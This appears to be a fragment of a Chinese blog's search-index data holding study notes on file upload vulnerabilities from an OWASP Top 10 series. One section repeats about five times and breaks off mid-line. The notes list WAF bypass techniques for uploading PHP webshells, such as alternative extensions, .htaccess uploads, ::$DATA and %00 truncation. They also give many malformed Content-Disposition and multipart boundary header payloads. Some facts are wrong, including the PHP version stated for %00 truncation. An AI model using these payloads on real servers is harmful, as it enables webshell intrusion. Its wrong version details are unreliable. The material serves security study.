7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#多个分号"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#多个等号"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#变换content-disposition的值"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#畸形的boundary头部"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#顺序颠倒"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: 